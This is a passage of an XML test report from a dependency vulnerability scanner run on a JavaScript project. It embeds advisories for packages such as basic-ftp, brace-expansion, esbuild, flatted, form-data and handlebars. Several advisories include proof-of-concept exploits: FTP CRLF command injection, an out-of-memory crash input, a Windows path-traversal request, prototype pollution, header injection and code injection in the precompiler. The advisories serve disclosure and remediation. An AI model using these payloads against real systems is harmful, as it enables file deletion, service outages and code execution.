      <system-err>location: /Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?@xmldom/xmldom, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="53" name="/Users/timothylefkowitz/projects/provenance/Test.js" package="Test.js" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="Test.js"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="54" name="/Users/timothylefkowitz/projects/provenance/package.json?/ai:^6.0.208" package="ai:6.0.208" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="ai:6.0.208"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="55" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?ajv" package="ajv" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-2g4f-4pwh-qvx6" name="pkg:npm/ajv">
                      
      <failure message="unscored severity: moderate"/>
                  
      <system-out>ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\"^(a|a)*$\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?ajv, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="56" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/eslint/apps.js" package="apps.js" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="apps.js"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="57" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/eslint/base.js" package="base.js" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="base.js"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="58" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?basic-ftp" package="basic-ftp" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-6v7q-wjvx-w8wg" name="pkg:npm/basic-ftp">
                      
      <failure message="cvssV3: HIGH, score: 8.199999809265137 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)"/>
                  
      <system-out>## Summary

basic-ftp's CRLF injection protection (added in commit 2ecc8e2 for GHSA-chqc-8p9q-pq6q) is incomplete. Two code paths bypass the `protectWhitespace()` control character check: (1) the `login()` method directly concatenates user-supplied credentials into USER/PASS FTP commands without any validation, and (2) the `_openDir()` method sends an MKD command before `cd()` invokes `protectWhitespace()`, creating a TOCTOU bypass. Both vectors allow an attacker who controls input to inject arbitrary FTP commands into the control connection.

## Details

### Vector 1: Credential Injection (login)

The `login()` method constructs FTP commands by direct string concatenation with no CRLF validation:

```typescript
// src/Client.ts:216-231
login(user = "anonymous", password = "guest"): Promise&lt;FTPResponse&gt; {
    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)
    return this.ftp.handle("USER " + user, (res, task) =&gt; {  // Line 218: no validation on `user`
        // ...
        else if (res.code === 331) {
            this.ftp.send("PASS " + password)  // Line 226: no validation on `password`
        }
    })
}
```

`FtpContext.send()` writes directly to the TCP socket:

```typescript
// src/FtpContext.ts:223-227
send(command: string) {
    // ...
    this._socket.write(command + "\r\n", this.encoding)
}
```

The `protectWhitespace()` method (line 762) rejects `\r`, `\n`, and `\0` characters — but it is only called for path-based operations. Credentials never pass through it.

The public `access()` method (line 268) passes `options.user` and `options.password` directly to `login()` with no sanitization.

### Vector 2: MKD TOCTOU Bypass (_openDir)

The `_openDir()` method sends an MKD command before the CRLF check in `cd()`:

```typescript
// src/Client.ts:745-748
protected async _openDir(dirName: string) {
    await this.sendIgnoringError("MKD " + dirName)  // Line 746: sent BEFORE validation
    await this.cd(dirName)                           // Line 747: protectWhitespace() called here — too late
}
```

This is called from `ensureDir()` (line 729) which splits a user-supplied remote path by `/` and passes each fragment to `_openDir()`, and from `_uploadToWorkingDir()` (line 679) which passes local directory names read from the filesystem.

## PoC

### Vector 1: Credential Injection

```javascript
const ftp = require("basic-ftp");

async function exploit() {
    const client = new ftp.Client();
    client.ftp.verbose = true;

    // Connect to target FTP server
    await client.access({
        host: "target-ftp-server",
        port: 21,
        // Username contains CRLF + injected DELE command
        user: "anonymous\r\nDELE important.txt",
        password: "guest"
    });
    // Server receives on the wire:
    //   USER anonymous\r\n
    //   DELE important.txt\r\n
    //   PASS guest\r\n
    // The DELE command executes before PASS is processed

    client.close();
}

exploit();
```

### Vector 2: MKD TOCTOU Bypass

```javascript
const ftp = require("basic-ftp");

async function exploit() {
    const client = new ftp.Client();
    client.ftp.verbose = true;

    await client.access({
        host: "target-ftp-server",
        user: "anonymous",
        password: "guest"
    });

    // Path fragment with CRLF — MKD is sent before cd() validates
    try {
        await client.ensureDir("test\r\nDELE important.txt/subdir");
    } catch (e) {
        // cd() throws after protectWhitespace() rejects, but MKD + DELE already sent
    }
    // Server received:
    //   MKD test\r\n
    //   DELE important.txt\r\n
    //   CWD test\r\n  &lt;-- this may fail, but damage is done

    client.close();
}

exploit();
```

## Impact

An attacker who controls credentials or remote paths passed to basic-ftp can inject arbitrary FTP commands into the control connection. This enables:

- **File deletion**: Inject `DELE` commands to remove files on the FTP server
- **File manipulation**: Inject `RNFR`/`RNTO` to rename files, `MKD`/`RMD` to create/remove directories
- **Server commands**: Inject `SITE` commands (e.g., `SITE CHMOD`) to change permissions
- **Session hijacking**: Inject `USER`/`PASS` to re-authenticate as a different user

The credential injection vector (Vector 1) is particularly dangerous because it occurs before authentication, meaning the injected commands execute with whatever default permissions the server grants during the login handshake.

Applications that accept user-supplied FTP credentials (e.g., web-based file managers, backup tools, deployment systems) are directly vulnerable.

## Recommended Fix

Add CRLF validation to both code paths:

**1. Validate credentials in `login()`:**

```typescript
// src/Client.ts:216
login(user = "anonymous", password = "guest"): Promise&lt;FTPResponse&gt; {
    if (/[\r\n\0]/.test(user) || /[\r\n\0]/.test(password)) {
        return Promise.reject(new Error("Invalid credentials: Contains control characters"));
    }
    this.ftp.log(`Login security: ${describeTLS(this.ftp.socket)}`)
    return this.ftp.handle("USER " + user, (res, task) =&gt; {
        // ... rest unchanged
    })
}
```

**2. Validate dirName in `_openDir()` before sending MKD:**

```typescript
// src/Client.ts:745
protected async _openDir(dirName: string) {
    if (/[\r\n\0]/.test(dirName)) {
        throw new Error("Invalid path: Contains control characters");
    }
    await this.sendIgnoringError("MKD " + dirName)
    await this.cd(dirName)
}
```

Alternatively, centralize CRLF validation in `FtpContext.send()` so that all FTP commands are protected regardless of the calling code path.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?basic-ftp, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="59" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?brace-expansion" package="brace-expansion" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-mh99-v99m-4gvg" name="pkg:npm/brace-expansion">
                      
      <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
                  
      <system-out>### Summary

`expand()` bounds the *number* of results it produces (the `max` option,
`100_000` by default) but not their *length*. By chaining many brace groups,
an attacker keeps the result count under `max` while making every result grow
with the number of groups. Building `max` long results — plus the intermediate
arrays combined at each brace group — exhausts memory and crashes the Node
process with an **uncatchable** out-of-memory error. `try/catch` around
`expand()` does not help: the fatal error terminates the process.

A ~7.5 KB input (`'{a,b}'.repeat(1500)`) is enough to crash a default Node
process.

### Details

For `N` chained brace groups such as `'{a,b}'.repeat(N)`:

- the result count is `2^N`, immediately capped at `max` (`100_000`), so the
  `max` protection appears to hold, but
- each result is `N` characters long, so the total output size is
  `max × N` characters, which grows without bound in `N`.

`expand_` combines each brace set with the fully-expanded tail:

```js
const post = m.post.length ? expand_(m.post, max, false) : ['']
...
for (let j = 0; j &lt; N.length; j++) {
  for (let k = 0; k &lt; post.length &amp;&amp; expansions.length &lt; max; k++) {
    const expansion = pre + N[j] + post[k]   // grows one group longer per level
    ...
    expansions.push(expansion)
  }
}
```

The loop guard `expansions.length &lt; max` limits how many strings are built, but
nothing limits how long they get. Each recursion level materializes another
array of up to `max` strings, one character longer than the level below, and —
because V8 represents `pre + N[j] + post[k]` as a cons-string (rope) that
references `post[k]` — those intermediate strings stay reachable through the
whole chain. Memory therefore scales with `max × N`.

Measured on `5.0.7` (`'{a,b}'.repeat(N)`, default `max`):

| groups (N) | input bytes | result count | peak RSS |
|---|---|---|---|
| 20 | 100 | 100,000 | ~80 MB |
| 50 | 250 | 100,000 | ~214 MB |
| 100 | 500 | 100,000 | ~409 MB |
| 300 | 1,500 | 100,000 | ~1,148 MB |
| 1500 | 7,500 | — | **OOM crash** |

### Proof of concept

```js
const { expand } = require('brace-expansion')

// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
//   FATAL ERROR: ... JavaScript heap out of memory
try {
  expand('{a,b}'.repeat(1500))
} catch (e) {
  // never reached — the process is already dead
}
```

### Impact

Any application that passes attacker-influenced strings to
`brace-expansion.expand()` — directly, or transitively via `minimatch` / `glob`
brace patterns — can be crashed by a small request. Because the failure is a
fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
and it takes down the whole worker/process, denying service.

### Remediation

Upgrade to a patched release. The fix bounds the total number of characters a
single `expand()` call may accumulate (`EXPANSION_MAX_LENGTH`, default
`4_000_000`, configurable via a new `maxLength` option), applied inside the
output-building loops so intermediate arrays are bounded too. Once the limit is
reached, output is truncated — consistent with how `max` already truncates —
instead of growing without bound. The limit sits well above any realistic
expansion (100,000 results hitting `max` measure ~1M characters), so legitimate
input is unaffected.

After the fix, `'{a,b}'.repeat(1500)` returns a bounded, truncated result in
~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
heap.

The fix bounds memory but the algorithm still rebuilds intermediate arrays at
each level (roughly `O(N × maxLength)` work on this input class). A streaming
rewrite that produces output in `O(total output size)` can be a non-urgent
follow-up.

If immediate upgrade isn't possible, avoid passing untrusted input to
`expand()` / glob brace patterns, or pass a small explicit `max` **and**
`maxLength`.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?brace-expansion, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="60" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/clsx:^2.1.1" package="clsx:2.1.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="clsx:2.1.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="61" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/ui/package.json?ui:0.1.0/cmdk:1.1.1" package="cmdk:1.1.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="cmdk:1.1.1"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="62" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/apps/web/package.json?/date-fns:^4.1.0" package="date-fns:4.1.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="date-fns:4.1.0"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="63" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?diff" package="diff" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-73rr-hh4g-fpgx" name="pkg:npm/diff">
                      
      <failure message="unscored severity: low"/>
                  
      <system-out>### Impact

Attempting to parse a patch whose filename headers contain the line break characters `\r`, `\u2028`, or `\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.

Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).

The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.

Finally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its "leading garbage"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.

### Patches

All vulnerabilities described are fixed in v8.0.3.

### Workarounds

If using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\r`, `\u2028`, or `\u2029`.

### References

PR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649


### CVE Notes

Note that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?diff, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="64" name="/Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?esbuild" package="esbuild" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-g7r4-m6w7-qqqr" name="pkg:npm/esbuild">
                      
      <failure message="cvssV3: LOW, score: 2.5 (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)"/>
                  
      <system-out>### Summary

The development server contains a path traversal vulnerability on Windows when serving files from `servedir`.

Due to the use of `path.Clean()` (which only normalizes forward-slash `/` separators) instead of a Windows-aware path normalization function, it is possible to craft requests using backslashes (`\`) that bypass the intended directory containment logic. An attacker can escape the configured `servedir` root and access arbitrary files on the filesystem.
This issue affects Windows environments only.

### Details

The request path is sanitized using:
```go
// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165
queryPath := path.Clean(req.URL.Path)[1:]
```


However:
- `path.Clean()` is POSIX-style and only understands `/` (docs: `https://pkg.go.dev/path#Clean`)
- On Windows, `\` is a valid path separator
- `path.Clean()` does not treat `\` as a separator

Later, the server constructs the absolute path:
```go
// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221
absPath := h.fs.Join(h.servedir, queryPath)
```

If `queryPath` contains sequences such as:
```
..\..\..\..\..\..\..\Windows\system.ini
```

`path.Clean()` will not normalize them, but the Windows filesystem will interpret `\` as directory separators when resolving `absPath`.
Because the implementation does not verify that the final resolved path remains within `servedir`, it allows directory traversal outside the intended root directory.
### Vulnerable Code

```go
// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165
	queryPath := path.Clean(req.URL.Path)[1:]
	....
	// Check for a file in the "servedir" directory
	if h.servedir != "" &amp;&amp; kind != fs.FileEntry {
		absPath := h.fs.Join(h.servedir, queryPath)
		if absDir := h.fs.Dir(absPath); absDir != absPath {
			if entries, err, _ := h.fs.ReadDirectory(absDir); err == nil {
				if entry, _ := entries.Get(h.fs.Base(absPath)); entry != nil &amp;&amp; entry.Kind(h.fs) == fs.FileEntry {
	....				
```


### Steps to reproduce

```
npm install --save-exact --save-dev esbuild

echo "console.log(1)" &gt; app.js

.\node_modules\.bin\esbuild --version
0.27.3

.\node_modules\.bin\esbuild app.js --bundle --outdir=www --servedir=www --watch

curl -i --path-as-is "http://localhost:8000/..\..\..\..\..\..\..\Windows\system.ini"
&lt;content of Windows\system.ini&gt;
```


### Impact

- Arbitrary file read on Windows
- Exposure of sensitive files</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?esbuild, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="65" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/eslint/package.json?eslint-config:0.2.0/eslint-config-next:16.0.6" package="eslint-config-next:16.0.6" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="eslint-config-next:16.0.6"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="66" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/tooling/eslint/package.json?eslint-config:0.2.0/eslint-config-turbo:^2.5.8" package="eslint-config-turbo:2.5.8" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="eslint-config-turbo:2.5.8"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="67" name="/Users/timothylefkowitz/projects/provenance/package.json?/exifr:^7.1.3" package="exifr:7.1.3" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="exifr:7.1.3"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="68" name="/Users/timothylefkowitz/projects/provenance/package.json?/ffmpeg-static:^5.2.0" package="ffmpeg-static:5.3.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="ffmpeg-static:5.3.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="69" name="/Users/timothylefkowitz/projects/provenance/package.json?/file-type:^22.0.1" package="file-type:22.0.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="file-type:22.0.1"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="70" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?flatted" package="flatted" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-rf6f-7fwh-wjgh" name="pkg:npm/flatted">
                      
      <failure message="unscored severity: high"/>
                  
      <system-out>---
  **Summary**

  The parse() function in flatted can use attacker-controlled string values from the parsed JSON as direct array index
  keys, without validating that they are numeric. Since the internal input buffer is a JavaScript Array, accessing it
  with the key "\_\_proto\_\_" returns Array.prototype via the inherited getter. This object is then treated as a legitimate
   parsed value and assigned as a property of the output object, effectively leaking a live reference to Array.prototype
   to the consumer. Any code that subsequently writes to that property will pollute the global prototype.

  ---
  **Root Cause**

  File: esm/index.js:29 (identical in cjs/index.js)
```
  const resolver = (input, lazy, parsed, $) =&gt; output =&gt; {
    for (let ke = keys(output), {length} = ke, y = 0; y &lt; length; y++) {
      const k = ke[y];
      const value = output[k];    
      if (value instanceof Primitive) {
        const tmp = input[value];      // Bug is here
```

No validation that value is a safe numeric index input is built as a plain Array. JavaScript's property lookup on arrays traverses the prototype chain for non-numeric  keys. The key "\_\_proto\_\_" resolves to Array.prototype, which:

  - has type "object" → passes the typeof tmp === object guard at line 30
  - is not in the parsed Set yet → passes the !parsed.has(tmp) guard.
  - The reference to Array.prototype is then enqueued in lazy and later unconditionally assigned to the output object.
  ---
  **Replication Steps**
```
  const Flatted = require('flatted'); 
  const parsed = Flatted.parse('[{"x":"__proto__"}]');
  parsed.x.polluted = 'pwned';
  console.log([].polluted);  // Returns true
``` 
 ---
  **Impact**
 An attacker can supply a crafted flatted string to parse() that causes the returned object to hold a live reference to Array.prototype, enabling any downstream code that writes to that property to pollute the global prototype chain, potentially causing denial of service or code execution.

  **Recommended solution**
 Validate that the index string represents an integer within the bounds of input before accessing it:

  // Before (vulnerable)
  const tmp = input[value];

  // After (safe)
  const idx = +value;  // coerce boxed String → number
  const tmp = (Number.isInteger(idx) &amp;&amp; idx &gt;= 0 &amp;&amp; idx &lt; input.length)
    ? input[idx]
    : undefined;</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?flatted, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="71" name="/Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?form-data" package="form-data" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-hmw2-7cc7-3qxx" name="pkg:npm/form-data">
                      
      <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)"/>
                  
      <system-out>## Summary

`form-data` builds `multipart/form-data` request bodies. Through v4.0.5, the `field` name passed to `FormData#append` and the `filename` option are concatenated directly into the `Content-Disposition` header with no escaping of CR (`\r`), LF (`\n`), or `"`. An application that uses **untrusted input as a field name or filename** therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.

This is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is **conditional**: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.

## Details

In `lib/form_data.js`, `_multiPartHeader` builds the part header as:

```javascript
'Content-Disposition': ['form-data', 'name="' + field + '"'].concat(contentDisposition || [])
```

and `_getContentDisposition` builds `filename="' + filename + '"'`. Neither escapes control characters, so a `\r\n` in `field`/`filename` ends the header line. The same applies to `"`, which can break out of the quoted parameter.

### Proof of concept

```javascript
const FormData = require('form-data');
const form = new FormData();
form.append('email"\r\nX-Injected: true\r\nfake="', 'user@example.com');
console.log(form.getBuffer().toString());
```

Before the fix this emits an injected `X-Injected: true` header line. A field name that also includes `--&lt;boundary&gt;` sequences can introduce additional parts (e.g. an extra `name="is_admin"` field), which a downstream parser accepts as legitimate.

## Impact

For an application that uses untrusted field names/filenames:

- **Field injection / override (integrity).** Inject or override fields the backend trusts (e.g. `is_admin`, `role`) — the primary demonstrated impact.
- **Header injection** into the generated multipart part.

Claims of guaranteed privilege escalation, authentication bypass, high confidentiality impact, and availability impact are application-dependent downstream consequences, not properties of `form-data` itself, and are not demonstrated by the PoC.

### Severity

The demonstrated, library-attributable impact is integrity (field/header injection); there is no demonstrated confidentiality disclosure or availability impact in `form-data` itself, and exploitation requires the consuming app to feed untrusted data into field names/filenames. A Moderate (≈5.3, `I:L`) rating is also defensible given that precondition.

## Patch

Fixed in **4.0.6**, **3.0.5**, and **2.5.6**. Users on older 0.x/1.x/2.x releases should upgrade to 2.5.6 or later.

The fix escapes `\r`, `\n`, and `"` as `%0D`, `%0A`, and `%22` in field names and filenames, matching the WHATWG HTML `multipart/form-data` encoding algorithm that browsers implement. This neutralizes the injection while leaving ordinary field names (including `name[0]`, dotted, and unicode names) unchanged.

## Workaround

Until upgrading, validate or reject field names/filenames that contain control characters before calling `append`:

```javascript
if (/[\r\n]/.test(field)) { throw new Error('invalid field name'); }
```

## Credit

Reported by [yueyueL](https://github.com/yueyueL).</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/pnpm-lock.yaml?form-data, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="72" name="/Users/timothylefkowitz/projects/provenance/apps/collectibles/package.json?collectibles:0.0.1/framer-motion:^12.34.3" package="framer-motion:12.34.3" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="framer-motion:12.34.3"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="73" name="/Users/timothylefkowitz/projects/provenance/package.json?/framer-motion:^12.40.0" package="framer-motion:12.40.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="framer-motion:12.40.0"/>
        
  </testsuite>
          
  <testsuite failures="1" errors="0" time="0" id="74" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?handlebars" package="handlebars" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="GHSA-xjpj-3mr7-gcpf" name="pkg:npm/handlebars">
                      
      <failure message="cvssV3: HIGH, score: 8.199999809265137 (CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)"/>
                  
      <system-out>## Summary

The Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.

## Description

`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:

### 1. Template name injection

```javascript
// Vulnerable code pattern
output += 'templates["' + template.name + '"] = template(...)';
```

`template.name` is derived from the file system path. A filename containing `"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.

### 2. Namespace injection (`-n` / `--namespace`)

```javascript
// Vulnerable code pattern
output += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';
```

`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.

### 3. CommonJS path injection (`-c` / `--commonjs`)

```javascript
// Vulnerable code pattern
output += 'var Handlebars = require("' + opts.commonjs + '");';
```

`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `"` to close the string and inject further code.

### 4. AMD path injection (`-h` / `--handlebarPath`)

```javascript
// Vulnerable code pattern
output += "define(['" + opts.handlebarPath + "handlebars.runtime'], ...)";
```

`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.

All four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.

## Proof of Concept

**Template name vector (creates a file `pwned` on disk):**

```bash
mkdir -p templates
printf 'Hello' &gt; "templates/evil'] = (function(){require(\"fs\").writeFileSync(\"pwned\",\"1\")})(); //.handlebars"

node bin/handlebars templates -o out.js
node -e 'require("./out.js")'  # Executes injected code, creates ./pwned
```

**Namespace vector:**

```bash
node bin/handlebars templates -o out.js \
  -n "App.ns; require('fs').writeFileSync('pwned2','1'); //"
node -e 'require("./out.js")'
```

**CommonJS vector:**

```bash
node bin/handlebars templates -o out.js \
  -c 'handlebars"); require("fs").writeFileSync("pwned3","1"); //'
node -e 'require("./out.js")'
```

**AMD vector:**

```bash
node bin/handlebars templates -o out.js -a \
  -h "'); require('fs').writeFileSync('pwned4','1'); // "
node -e 'require("./out.js")'
```

## Workarounds

- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`"`, `'`, `;`, etc.).
- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.
- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.
- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.</system-out>
                  
      <system-err>location: /Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/pnpm-lock.yaml?handlebars, project-references: [ pnpm-lock.yaml: transitive ]</system-err>
              
    </testcase>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="75" name="/Users/timothylefkowitz/projects/provenance/package.json?/heic-convert:^2.1.0" package="heic-convert:2.1.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="heic-convert:2.1.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="76" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/i18n/package.json?i18n:0.1.0/i18next-browser-languagedetector:8.2.0" package="i18next-browser-languagedetector:8.2.0" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="i18next-browser-languagedetector:8.2.0"/>
        
  </testsuite>
          
  <testsuite failures="0" errors="0" time="0" id="77" name="/Users/timothylefkowitz/projects/provenance/makerkit/nextjs-saas-starter-kit-lite/packages/i18n/package.json?i18n:0.1.0/i18next-resources-to-backend:^1.2.1" package="i18next-resources-to-backend:1.2.1" skipped="0" tests="1" timestamp="2026-07-31T12:21:20.072074">
                
    <testcase classname="dependency-check" name="i18next-resources-to-backend:1.2.1"/>
        
  </testsuite>
          
